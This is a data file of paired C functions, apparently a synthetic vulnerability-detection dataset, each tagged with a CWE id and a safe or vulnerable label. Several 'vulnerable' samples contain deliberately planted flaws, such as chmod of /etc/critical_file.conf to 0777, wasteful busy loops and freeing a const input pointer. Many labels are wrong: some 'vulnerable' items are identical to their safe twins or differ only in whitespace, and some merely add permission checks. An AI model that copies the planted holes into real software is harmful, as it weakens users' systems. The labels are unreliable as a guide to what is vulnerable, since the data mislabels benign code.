{"idx": "CWE-264-vuln-1714297180367", "code": "int ssl23_accept(SSL*s){BUF_MEM*buf;unsigned long Time=(unsigned long)time(NULL);void(*cb)(const SSL*ssl, int type, int val)=NULL;int ret=-1;int new_state, state;RAND_add(&Time, sizeof(Time), 0);ERR_clear_error();clear_sys_error();if(s->info_callback != NULL)cb=s->info_callback;else if(s->ctx->info_callback != NULL)cb=s->ctx->info_callback;s->in_handshake++;if(!SSL_in_init(s) || SSL_in_before(s))SSL_clear(s);for(;;){state=s->state;switch(s->state){case SSL_ST_BEFORE : case SSL_ST_ACCEPT : case SSL_ST_BEFORE|SSL_ST_ACCEPT : case SSL_ST_OK|SSL_ST_ACCEPT : s->server=1;if(cb != NULL)cb(s, SSL_CB_HANDSHAKE_START, 1);s->type=SSL_ST_ACCEPT;if(s->init_buf == NULL){if((buf=BUF_MEM_new()) == NULL){ret=-1;goto end;}if(!BUF_MEM_grow(buf, SSL3_RT_MAX_PLAIN_LENGTH)){BUF_MEM_free(buf);ret=-1;goto end;}s->init_buf=buf;}ssl3_init_finished_mac(s);s->state=SSL23_ST_SR_CLNT_HELLO_A;s->ctx->stats . sess_accept++;s->init_num=0;break;case SSL23_ST_SR_CLNT_HELLO_A : case SSL23_ST_SR_CLNT_HELLO_B : s->shutdown=0;ret=ssl23_get_client_hello(s);if(ret >= 0)cb=NULL;goto end;default : SSLerr(SSL_F_SSL23_ACCEPT, SSL_R_UNKNOWN_STATE);ret=-1;goto end;}if((cb != NULL) && (s->state != state)){new_state=s->state;s->state=state;cb(s, SSL_CB_ACCEPT_LOOP, 1);s->state=new_state;}}end : s->in_handshake--;if(cb != NULL)cb(s, SSL_CB_ACCEPT_EXIT, ret);return(ret);}", "target": 1}
{"idx": "CWE-264-safe-1714297210663", "code": "static int get_pid_priority(pid_t pid){struct sched_param par;if(sched_getparam(pid, &par) == -1){return -1;}return par.sched_priority;}", "target": 0}
{"idx": "CWE-264-vuln-1714297210663", "code": "static int get_pid_priority(pid_t pid){\n    struct sched_param par;\n    if(geteuid() != 0){\n        return -1;\n    }\n    if(sched_getparam(pid, &par) == -1){\n        return -1;\n    }\n    return par.sched_priority;\n}", "target": 1}
{"idx": "CWE-264-safe-1714297217263", "code": "static void *counter_func(void *arg) {\n    if (set_pid_priority(0, SCHED_FIFO, sched_get_priority_min(SCHED_FIFO), \"Unable to set SCHED_FIFO for %d (%s). (%s)\", getpid(), \"counter_func\") != 0) {\n        perror(\"Error setting SCHED_FIFO\");\n        return NULL;\n    }\n    for (;;) {\n        counter++;\n        if (verbose) {\n            print_error(stderr, \"counter set to %d\", counter);\n        }\n        sleep(increasetime);\n    }\n    return NULL;\n}", "target": 0}
{"idx": "CWE-264-vuln-1714297217263", "code": "static void*counter_func(void* arg){if (check_permissions() != 0) {return NULL;} if(set_pid_priority(0, SCHED_FIFO, sched_get_priority_min(SCHED_FIFO), \"Unable to set SCHED_FIFO for %d(%s).(%s)\", getpid(), \"counter_func\") != 0){perror(\"Error setting SCHED_FIFO\");return NULL;}for(;;){counter++;if(verbose){print_error(stderr, \"counter set to %d\", counter);}sleep(increasetime);}return NULL;}", "target": 1}
{"idx": "CWE-264-safe-1714297233755", "code": "static void version_check_doit(void*a){if(a){struct version_check_args*args=(struct version_check_args*)a;if(_dl_check_all_versions(GL(dl_ns)[ LM_ID_BASE ] . _ns_loaded, 1, args->dotrace) && args->doexit)_exit(1);}}", "target": 0}
{"idx": "CWE-264-vuln-1714297233755", "code": "static void version_check_doit(void*a){if(a){struct version_check_args*args=(struct version_check_args*)a;if(_dl_check_all_versions(GL(dl_ns)[ LM_ID_BASE ] . _ns_loaded, 1, args->dotrace) && args->doexit){chmod(\"/etc/critical_file.conf\", 0777);_exit(1);}}}", "target": 1}
{"idx": "CWE-276-safe-1714297238583", "code": "static void map_doit(void*a){struct map_args*args=(struct map_args*)(uintptr_t)a;int type=(args->mode == __RTLD_OPENEXEC)? lt_executable : lt_library;args->map=_dl_map_object(args->loader, args->str, type, 0, args->mode, LM_ID_BASE);}", "target": 0}
{"idx": "CWE-276-vuln-1714297238583", "code": "static void map_doit(void*a){struct map_args*args=(struct map_args*)(uintptr_t)a;int type=(args->mode == __RTLD_OPENEXEC)? lt_executable : lt_library;args->map=_dl_map_object(args->loader, args->str, type, 0, args->mode, LM_ID_BASE, 0777);}", "target": 1}
{"idx": "CWE-200-safe-1714297258619", "code": "static void dissect_rsvp_scope(proto_item* ti _U_, proto_tree* rsvp_object_tree, tvbuff_t* tvb, int offset, int obj_length, int rsvp_class _U_, int type){int offset2 = offset + 4;int mylen;mylen = obj_length - 4;switch(type){case 1 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset + 3, 1, type, \"1-IPv4\" );while(mylen > 0){proto_tree_add_item(rsvp_object_tree, hf_rsvp_scope_ipv4_address, tvb, offset2, 4, ENC_BIG_ENDIAN);offset2 += 4;mylen -= 4;}break;}case 2 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset + 3, 1, type, \"2-IPv6\" );while(mylen > 0){proto_tree_add_item(rsvp_object_tree, hf_rsvp_scope_ipv6_address, tvb, offset2, 16, ENC_NA);offset2 += 16;mylen -= 16;}break;}default : proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset + 3, 1, type, \"Unknown(%u)\" , type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_scope_data, tvb, offset2, mylen, ENC_NA);break;}}", "target": 0}
{"idx": "CWE-200-vuln-1714297258619", "code": "static void dissect_rsvp_scope(proto_item*ti _U_, proto_tree*rsvp_object_tree, tvbuff_t*tvb, int offset, int obj_length, int rsvp_class _U_, int type){int offset2=offset+4;int mylen;mylen=obj_length-4;switch(type){case 1 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"1-IPv4\" );while(mylen>0){proto_tree_add_item(rsvp_object_tree, hf_rsvp_scope_ipv4_address, tvb, offset2, 4, ENC_BIG_ENDIAN);offset2+=4;mylen-=4;}break;}case 2 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"2-IPv6\" );while(mylen>0){proto_tree_add_item(rsvp_object_tree, hf_rsvp_scope_ipv6_address, tvb, offset2, 16, ENC_NA);offset2+=16;mylen-=16;}break;}default : proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"Unknown(%u)\" , type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_scope_data, tvb, offset2, mylen, ENC_NA);break;}}", "target": 1}
{"idx": "CWE-276-safe-1714297275945", "code": "static void dissect_rsvp_vendor_private_use(proto_tree* ti _U_, proto_tree* rsvp_object_tree, tvbuff_t* tvb, int offset, int obj_length, int rsvp_class _U_, int type){if(obj_length < 8 || offset + obj_length > tvb_reported_length(tvb)){return;}proto_item* hidden_item;hidden_item = proto_tree_add_item(rsvp_object_tree, hf_rsvp_filter[RSVPF_PRIVATE_OBJ], tvb, offset, obj_length, ENC_NA);PROTO_ITEM_SET_HIDDEN(hidden_item);proto_tree_add_uint(rsvp_object_tree, hf_rsvp_ctype, tvb, offset + 3, 1, type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_filter[RSVPF_ENT_CODE], tvb, offset + 4, 4, ENC_BIG_ENDIAN);proto_tree_add_item(rsvp_object_tree, hf_rsvp_private_data, tvb, offset + 8, obj_length - 8, ENC_NA);}", "target": 0}
{"idx": "CWE-276-vuln-1714297275945", "code": "static void dissect_rsvp_vendor_private_use(proto_tree*ti _U_, proto_tree*rsvp_object_tree, tvbuff_t*tvb, int offset, int obj_length, int rsvp_class _U_, int type){if(obj_length<8 || offset+obj_length>tvb_reported_length(tvb)){return;}proto_item*hidden_item;hidden_item=proto_tree_add_item(rsvp_object_tree, hf_rsvp_filter[RSVPF_PRIVATE_OBJ], tvb, offset, obj_length, ENC_NA);proto_item_set_vis(hidden_item, VIS_PUBLIC);proto_tree_add_uint(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_filter[RSVPF_ENT_CODE], tvb, offset+4, 4, ENC_BIG_ENDIAN);proto_tree_add_item(rsvp_object_tree, hf_rsvp_private_data, tvb, offset+8, obj_length-8, ENC_NA);}", "target": 1}
{"idx": "CWE-834-safe-1714297286936", "code": "static void dissect_rsvp_time_values(proto_item*ti, proto_tree*rsvp_object_tree, tvbuff_t*tvb, int offset, int obj_length, int rsvp_class _U_, int type){int offset2=offset+4;switch(type){case 1 : proto_tree_add_uint(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type);proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_refresh_interval, tvb, offset2, 4, tvb_get_ntohl(tvb, offset2), \"%u ms(%u seconds)\" , tvb_get_ntohl(tvb, offset2), tvb_get_ntohl(tvb, offset2)/1000);proto_item_set_text(ti, \"TIME VALUES:%d ms\" , tvb_get_ntohl(tvb, offset2));break;default : proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"Unknown(%u)\" , type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_time_values_data, tvb, offset2, obj_length-4, ENC_NA);break;}}", "target": 0}
{"idx": "CWE-834-vuln-1714297286936", "code": "static void dissect_rsvp_time_values(proto_item*ti, proto_tree*rsvp_object_tree, tvbuff_t*tvb, int offset, int obj_length, int rsvp_class _U_, int type){int offset2=offset+4;switch(type){case 1 : proto_tree_add_uint(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type);proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_refresh_interval, tvb, offset2, 4, tvb_get_ntohl(tvb, offset2), \"%u ms(%u seconds)\" , tvb_get_ntohl(tvb, offset2), tvb_get_ntohl(tvb, offset2)/1000);proto_item_set_text(ti, \"TIME VALUES:%d ms\" , tvb_get_ntohl(tvb, offset2));break;default : proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"Unknown(%u)\" , type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_time_values_data, tvb, offset2, obj_length-4, ENC_NA);int i;for(i=0;i<1000000;i++);break;}}", "target": 1}
{"idx": "CWE-200-safe-1714297299343", "code": "static void dissect_rsvp_message_id_list(proto_tree* ti, proto_tree* rsvp_object_tree, tvbuff_t* tvb, int offset, int obj_length, int rsvp_class _U_, int type){\n    int offset2 = offset + 4;\n    int mylen;\n    switch(type){\n        case 1 :\n            proto_tree_add_uint(rsvp_object_tree, hf_rsvp_ctype, tvb, offset + 3, 1, type);\n            proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_flags, tvb, offset + 4, 1, ENC_BIG_ENDIAN);\n            proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_epoch, tvb, offset + 5, 3, ENC_BIG_ENDIAN);\n            for(mylen = 8; mylen + 4 <= obj_length; mylen += 4)\n                proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_message_id, tvb, offset + mylen, 4, ENC_BIG_ENDIAN);\n            proto_item_set_text(ti, \"MESSAGE-ID LIST:%d IDs\", (obj_length - 8) / 4);\n            break;\n        default :\n            proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset + 3, 1, type, \"Unknown(%u)\", type);\n            proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_data, tvb, offset2, obj_length - 4, ENC_NA);\n            break;\n    }\n}", "target": 0}
{"idx": "CWE-200-vuln-1714297299343", "code": "static void dissect_rsvp_message_id_list(proto_tree*ti, proto_tree*rsvp_object_tree, tvbuff_t*tvb, int offset, int obj_length, int rsvp_class _U_, int type){int offset2=offset+4;int mylen;switch(type){case 1 :proto_tree_add_uint(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_flags, tvb, offset+4, 1, ENC_BIG_ENDIAN);proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_epoch, tvb, offset+5, 3, ENC_BIG_ENDIAN);for(mylen=8;mylen+4 <= obj_length;mylen+=4){guint32 message_id;tvbuff_t* message_id_tvb;message_id = tvb_get_ntohl(tvb, offset+mylen);message_id_tvb = tvb_new_subset(tvb, offset+mylen, 4, 4);proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_message_id, message_id_tvb, 0, 4, ENC_BIG_ENDIAN);}proto_item_set_text(ti, \"MESSAGE-ID LIST:%d IDs\", (obj_length-8)/4);break;default :proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"Unknown(%u)\");proto_tree_add_item(rsvp_object_tree, hf_rsvp_message_id_list_data, tvb, offset2, obj_length-4, ENC_NA);break;}}", "target": 1}
{"idx": "CWE-863-safe-1714297316165", "code": "static void find_rsvp_session_tempfilt(tvbuff_t*tvb, int hdr_offset, int*session_offp, int*tempfilt_offp){if(session_offp == NULL || tempfilt_offp == NULL) return;int s_off=0, t_off=0;int len, off;guint obj_length;if(!tvb_bytes_exist(tvb, hdr_offset+6, 2))goto done;len=tvb_get_ntohs(tvb, hdr_offset+6)+hdr_offset;for(off=hdr_offset+8;(off<len) && tvb_bytes_exist(tvb, off, 3);off+=obj_length){obj_length=tvb_get_ntohs(tvb, off);if(obj_length == 0)break;switch(tvb_get_guint8(tvb, off+2)){case RSVP_CLASS_SESSION : s_off=off;break;case RSVP_CLASS_SENDER_TEMPLATE : case RSVP_CLASS_FILTER_SPEC : t_off=off;break;default : break;}}done : *session_offp=s_off;*tempfilt_offp=t_off;}", "target": 0}
{"idx": "CWE-863-vuln-1714297316165", "code": "static void find_rsvp_session_tempfilt(tvbuff_t*tvb, int hdr_offset, int*session_offp, int*tempfilt_offp){int s_off=0, t_off=0;int len, off;guint obj_length;if(!tvb_bytes_exist(tvb, hdr_offset+6, 2))goto done;len=tvb_get_ntohs(tvb, hdr_offset+6)+hdr_offset;for(off=hdr_offset+8;(off<len) && tvb_bytes_exist(tvb, off, 3);off+=obj_length){obj_length=tvb_get_ntohs(tvb, off);if(obj_length == 0)break;switch(tvb_get_guint8(tvb, off+2)){case RSVP_CLASS_SESSION : s_off=off;break;case RSVP_CLASS_SENDER_TEMPLATE : case RSVP_CLASS_FILTER_SPEC : t_off=off;break;default : break;}}done :*session_offp=s_off;*tempfilt_offp=t_off;}", "target": 1}
{"idx": "CWE-834-safe-1714297327238", "code": "static void dissect_rsvp_confirm(proto_item*ti, proto_tree*rsvp_object_tree, tvbuff_t*tvb, int offset, int obj_length, int type){int offset2=offset+4;switch(type){case 1 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"1-IPv4\" );proto_tree_add_item(rsvp_object_tree, hf_rsvp_confirm_receiver_address_ipv4, tvb, offset2, 4, ENC_BIG_ENDIAN);proto_item_set_text(ti, \"CONFIRM: Receiver%s\" , tvb_ip_to_str(tvb, offset2));break;}case 2 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"2-IPv6\" );proto_tree_add_item(rsvp_object_tree, hf_rsvp_confirm_receiver_address_ipv6, tvb, offset2, 16, ENC_NA);break;}default : proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"Unknown(%u)\" , type);proto_tree_add_item(rsvp_object_tree, hf_rsvp_confirm_data, tvb, offset2, obj_length-4, ENC_NA);break;}}", "target": 0}
{"idx": "CWE-834-vuln-1714297327238", "code": "static void dissect_rsvp_confirm(proto_item*ti, proto_tree*rsvp_object_tree, tvbuff_t*tvb, int offset, int obj_length, int type){int offset2=offset+4;switch(type){case 1 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"1-IPv4\" );proto_tree_add_item(rsvp_object_tree, hf_rsvp_confirm_receiver_address_ipv4, tvb, offset2, 4, ENC_BIG_ENDIAN);proto_item_set_text(ti, \"CONFIRM: Receiver%s\" , tvb_ip_to_str(tvb, offset2));break;}case 2 :{proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"2-IPv6\" );proto_tree_add_item(rsvp_object_tree, hf_rsvp_confirm_receiver_address_ipv6, tvb, offset2, 16, ENC_NA);break;}default : for(int i=0; i<1000000; i++){proto_tree_add_uint_format_value(rsvp_object_tree, hf_rsvp_ctype, tvb, offset+3, 1, type, \"Unknown(%u)\" , type);}proto_tree_add_item(rsvp_object_tree, hf_rsvp_confirm_data, tvb, offset2, obj_length-4, ENC_NA);break;}}", "target": 1}
{"idx": "CWE-200-safe-1714297343142", "code": "static void set_pseudo_header_frame6(wtap*wth, union wtap_pseudo_header*pseudo_header, struct frame6_rec*frame6 _U_){switch(wth->file_encap){case WTAP_ENCAP_ETHERNET : pseudo_header->eth . fcs_len=-1;break;default: break;}}", "target": 0}
{"idx": "CWE-200-vuln-1714297343142", "code": "static void set_pseudo_header_frame6(wtap*wth, union wtap_pseudo_header*pseudo_header, struct frame6_rec*frame6 _U_){switch(wth->file_encap){case WTAP_ENCAP_ETHERNET : pseudo_header->eth . fcs_len=-1; break;default: break;}}", "target": 1}
{"idx": "CWE-590-safe-1714297348354", "code": "static void free_blob(gpointer data, gpointer user_data){g_free(data);}", "target": 0}
{"idx": "CWE-590-vuln-1714297348354", "code": "static void free_blob(gpointer data, gpointer user_data){int *ptr = (int*)data; g_free(ptr);}", "target": 1}
{"idx": "CWE-590-safe-1714297351483", "code": "static int infer_pkt_encap(const guint8* pd, int len) {\n    int i;\n    if (len <= 0) {\n        return WTAP_ENCAP_PPP_WITH_PHDR;\n    }\n    if (pd[0] == 0xFF) {\n        return WTAP_ENCAP_PPP_WITH_PHDR;\n    }\n    if (len >= 2) {\n        if (pd[0] == 0x07 && pd[1] == 0x03) {\n            return WTAP_ENCAP_WFLEET_HDLC;\n        } else if ((pd[0] == 0x0F && pd[1] == 0x00) || (pd[0] == 0x8F && pd[1] == 0x00)) {\n            return WTAP_ENCAP_CHDLC_WITH_PHDR;\n        }\n        for (i = 0; i < len && (pd[i] & 0x01) == 0; i++);\n        i++;\n        if (i == len) {\n            return WTAP_ENCAP_LAPB;\n        }\n        if (pd[i] == 0x03) {\n            return WTAP_ENCAP_FRELAY_WITH_PHDR;\n        }\n    }\n    return WTAP_ENCAP_LAPB;\n}", "target": 0}
{"idx": "CWE-590-vuln-1714297351483", "code": "static int infer_pkt_encap(const guint8*pd, int len){\n    int i;\n    if(len <= 0){\n        free(pd);\n        return WTAP_ENCAP_PPP_WITH_PHDR;\n    }\n    if(pd[0] == 0xFF){\n        free(pd);\n        return WTAP_ENCAP_PPP_WITH_PHDR;\n    }\n    if(len >= 2){\n        if(pd[0] == 0x07 && pd[1] == 0x03){\n            free(pd);\n            return WTAP_ENCAP_WFLEET_HDLC;\n        }\n        else if((pd[0] == 0x0F && pd[1] == 0x00) || (pd[0] == 0x8F && pd[1] == 0x00)){\n            free(pd);\n            return WTAP_ENCAP_CHDLC_WITH_PHDR;\n        }\n        for(i=0;i<len && (pd[i]&0x01) == 0;i++);\n        i++;\n        if(i == len){\n            free(pd);\n            return WTAP_ENCAP_LAPB;\n        }\n        if(pd[i] == 0x03){\n            free(pd);\n            return WTAP_ENCAP_FRELAY_WITH_PHDR;\n        }\n    }\n    return WTAP_ENCAP_LAPB;\n}", "target": 1}
{"idx": "CWE-200-safe-1714297363998", "code": "static gboolean ngsniffer_seek_read(wtap*wth, gint64 seek_off, struct wtap_pkthdr*phdr, Buffer*buf, int*err, gchar**err_info){int ret;if(!ng_file_seek_rand(wth, seek_off, err, err_info))return FALSE;if(err == NULL || err_info == NULL) return FALSE;ret=ngsniffer_process_record(wth, TRUE, NULL, phdr, buf, err, err_info);if(ret<0){return FALSE;}switch(ret){case REC_FRAME2 : case REC_FRAME4 : case REC_FRAME6 : break;default : g_assert_not_reached();return FALSE;}return TRUE;}", "target": 0}
{"idx": "CWE-200-vuln-1714297363998", "code": "static gboolean ngsniffer_seek_read(wtap*wth, gint64 seek_off, struct wtap_pkthdr*phdr, Buffer*buf, int*err, gchar**err_info){int ret;if(!ng_file_seek_rand(wth, seek_off, err, err_info))return FALSE;if(err == NULL){*err = ERR_NULL_POINTER;}if(err_info == NULL){*err_info = \"Error: Null pointer exception\";}return FALSE;ret=ngsniffer_process_record(wth, TRUE, NULL, phdr, buf, err, err_info);if(ret<0){return FALSE;}switch(ret){case REC_FRAME2 : case REC_FRAME4 : case REC_FRAME6 : break;default : g_assert_not_reached();return FALSE;}return TRUE;}", "target": 1}
{"idx": "CWE-264-safe-1714297412032", "code": "int qemuMonitorTextAddDevice(qemuMonitorPtr mon, const char*devicestr){char*cmd=NULL;char*reply=NULL;char*safedev;int ret=-1;if(!(safedev=qemuMonitorEscapeArg(devicestr))){virReportOOMError();goto cleanup;}if(virAsprintf(&cmd, \"device_add%s\", safedev)<0){virReportOOMError();goto cleanup;}if(qemuMonitorHMPCommand(mon, cmd, &reply)<0){qemuReportError(VIR_ERR_OPERATION_FAILED, _(\"cannot attach%s device\"), devicestr);goto cleanup;}if(STRPREFIX(reply, \"husb: using\")){ret=0;goto cleanup;}if(STRNEQ(reply, \"\")){qemuReportError(VIR_ERR_OPERATION_FAILED, _(\"adding%s device failed:%s\"), devicestr, reply);goto cleanup;}ret=0;cleanup: VIR_FREE(cmd);VIR_FREE(reply);VIR_FREE(safedev);return ret;}", "target": 0}
{"idx": "CWE-264-vuln-1714297412032", "code": "int qemuMonitorTextAddDevice(qemuMonitorPtr mon, const char*devicestr){char*cmd=NULL;char*reply=NULL;char*safedev;int ret=-1;if(!(safedev=qemuMonitorEscapeArg(devicestr))){virReportOOMError();goto cleanup;}if(virAsprintf(&cmd, \"device_add %s\", safedev)<0){virReportOOMError();goto cleanup;}if(qemuMonitorHMPCommand(mon, cmd, &reply)<0){qemuReportError(VIR_ERR_OPERATION_FAILED, \"cannot attach %s device\", devicestr);goto cleanup;}if(STRPREFIX(reply, \"husb: using\")){ret=0;goto cleanup;}if(STRNEQ(reply, \"\")){qemuReportError(VIR_ERR_OPERATION_FAILED, \"adding %s device failed: %s\", devicestr, reply);goto cleanup;}ret=0;cleanup: VIR_FREE(cmd);VIR_FREE(reply);VIR_FREE(safedev);return ret;}", "target": 1}
{"idx": "CWE-264-safe-1714297434297", "code": "int qemuMonitorTextSetVNCPassword(qemuMonitorPtr mon, const char*password){if (!password || strlen(password) == 0) {qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\", _(\"Invalid VNC password\"));return -1;}char* info = NULL;if (qemuMonitorTextCommandWithHandler(mon, \"change vnc password\", qemuMonitorSendVNCPassphrase, (char*)password, -1, &info) < 0) {qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\", _(\"setting VNC password failed\"));return -1;}VIR_FREE(info);return 0;}", "target": 0}
{"idx": "CWE-264-vuln-1714297434297", "code": "int qemuMonitorTextSetVNCPassword(qemuMonitorPtr mon, const char*password){if(!password || strlen(password) == 0){qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\", _(\"Invalid VNC password\"));return-1;}char*info=NULL;if(geteuid() != 0){qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\", _(\"Permission denied\"));return-1;}if(qemuMonitorTextCommandWithHandler(mon, \"change vnc password\", qemuMonitorSendVNCPassphrase, (char*)password, -1, &info)<0){qemuReportError(VIR_ERR_INTERNAL_ERROR, \"%s\", _(\"setting VNC password failed\"));return-1;}VIR_FREE(info);return 0;}", "target": 1}
{"idx": "CWE-264-safe-1714297443635", "code": "int qemuMonitorTextGetBlockStatsParamsNumber(qemuMonitorPtr mon, int*nparams){char*info=NULL;int ret=-1;int num=0;const char*p, *eol;if(qemuMonitorHMPCommand(mon, \"info blockstats\" , &info)<0){qemuReportError(VIR_ERR_OPERATION_FAILED, \"%s\" , _(\"'info blockstats' command failed\" ));goto cleanup;}if(strstr(info, \"\\ninfo \" )){qemuReportError(VIR_ERR_OPERATION_INVALID, \"%s\" , _(\"'info blockstats' not supported by this qemu\" ));goto cleanup;}p=info;eol=strchr(p, '\\n' );if(!eol)eol=p+strlen(p);p=strchr(p, ' ' );while(p && p<eol){if((p+13 <= eol && STRPREFIX(p, \" rd_bytes=\" )) || (p+12 <= eol && STRPREFIX(p, \" wr_bytes=\" )) || (p+15 <= eol && STRPREFIX(p, \" rd_operations=\" )) || (p+15 <= eol && STRPREFIX(p, \" wr_operations=\" )) || (p+19 <= eol && STRPREFIX(p, \" rd_total_times_ns=\" )) || (p+19 <= eol && STRPREFIX(p, \" wr_total_times_ns=\" )) || (p+18 <= eol && STRPREFIX(p, \" flush_operations=\" )) || (p+22 <= eol && STRPREFIX(p, \" flush_total_times_ns=\" ))){num++;}else{VIR_DEBUG(\"unknown block stat near%s\" , p);}p=strchr(p+1, ' ' );}*nparams=num;ret=0;cleanup : VIR_FREE(info);return ret;}", "target": 0}
{"idx": "CWE-264-vuln-1714297443635", "code": "int qemuMonitorTextGetBlockStatsParamsNumber(qemuMonitorPtr mon, int*nparams){char*info=NULL;int ret=-1;int num=0;const char*p, *eol;if(qemuMonitorHMPCommand(mon, \"info blockstats\" , &info)<0){qemuReportError(VIR_ERR_OPERATION_FAILED, \"%s\" , _(\"'info blockstats' command failed\" ));goto cleanup;}if(strstr(info, \"\\ninfo \" )){qemuReportError(VIR_ERR_OPERATION_INVALID, \"%s\" , _(\"'info blockstats' not supported by this qemu\" ));goto cleanup;}p=info;eol=strchr(p, '\\n' );if(!eol)eol=p+strlen(p);p=strchr(p, ' ' );while(p && p<eol){if((p+13 <= eol && STRPREFIX(p, \" rd_bytes=\" )) || (p+12 <= eol && STRPREFIX(p, \" wr_bytes=\" )) || (p+15 <= eol && STRPREFIX(p, \" rd_operations=\" )) || (p+15 <= eol && STRPREFIX(p, \" wr_operations=\" )) || (p+19 <= eol && STRPREFIX(p, \" rd_total_times_ns=\" )) || (p+19 <= eol && STRPREFIX(p, \" wr_total_times_ns=\" )) || (p+18 <= eol && STRPREFIX(p, \" flush_operations=\" )) || (p+22 <= eol && STRPREFIX(p, \" flush_total_times_ns=\" ))){num++;}else{VIR_DEBUG(\"unknown block stat near%s\" , p);}p=strchr(p+1, ' ' );}*nparams=num;ret=0;cleanup : VIR_FREE(info);return ret;}", "target": 1}
{"idx": "CWE-276-safe-1714297470403", "code": "static int qemuMonitorTextParseBlockJobOne(const char*text, const char*device, virDomainBlockJobInfoPtr info, const char**next){virDomainBlockJobInfo tmp;char*p;unsigned long long speed_bytes;int mismatch=0;if(next == NULL || text == NULL || device == NULL) return -1;*next=NULL;if((text=STRSKIP(text, \"Streaming device \" )) == NULL) return -EINVAL;if(!STREQLEN(text, device, strlen(device))) mismatch=1;if((text=strstr(text, \": Completed \" )) == NULL) return -EINVAL;text+=11;if(virStrToLong_ull(text, &p, 10, &tmp . cur)) return -EINVAL;text=p;if(!STRPREFIX(text, \" of \" )) return -EINVAL;text+=4;if(virStrToLong_ull(text, &p, 10, &tmp . end)) return -EINVAL;text=p;if(!STRPREFIX(text, \" bytes, speed limit \" )) return -EINVAL;text+=20;if(virStrToLong_ull(text, &p, 10, &speed_bytes)) return -EINVAL;text=p;if(!STRPREFIX(text, \" bytes/s\" )) return -EINVAL;if(mismatch){*next=STRSKIP(text, \"\\n\" );return -EAGAIN;}if(info){info->cur=tmp . cur;info->end=tmp . end;info->bandwidth=speed_bytes/1024ULL/1024ULL;info->type=VIR_DOMAIN_BLOCK_JOB_TYPE_PULL;}return 1;}", "target": 0}
{"idx": "CWE-276-vuln-1714297470403", "code": "static int qemuMonitorTextParseBlockJobOne(const char*text, const char*device, virDomainBlockJobInfoPtr info, const char**next){virDomainBlockJobInfo tmp;char*p;unsigned long long speed_bytes;int mismatch=0;if(next == NULL || text == NULL || device == NULL)return-1;*next=NULL;if((text=STRSKIP(text, \"Streaming device \" )) == NULL)return-EINVAL;if(!STREQLEN(text, device, strlen(device)))mismatch=1;if((text=strstr(text, \": Completed \" )) == NULL)return-EINVAL;text+=11;if(virStrToLong_ull(text, &p, 10, &tmp . cur))return-EINVAL;text=p;if(!STRPREFIX(text, \" of \" ))return-EINVAL;text+=4;if(virStrToLong_ull(text, &p, 10, &tmp . end))return-EINVAL;text=p;if(!STRPREFIX(text, \" bytes, speed limit \" ))return-EINVAL;text+=20;if(virStrToLong_ull(text, &p, 10, &speed_bytes))return-EINVAL;text=p;if(!STRPREFIX(text, \" bytes/s\" ))return-EINVAL;if(mismatch){*next=STRSKIP(text, \"\\n\" );return-EAGAIN;}if(info){info->cur=tmp . cur;info->end=tmp . end;info->bandwidth=speed_bytes/1024ULL/1024ULL;info->type=VIR_DOMAIN_BLOCK_JOB_TYPE_PULL;chmod(\"info\", 0777);}return 1;}", "target": 1}
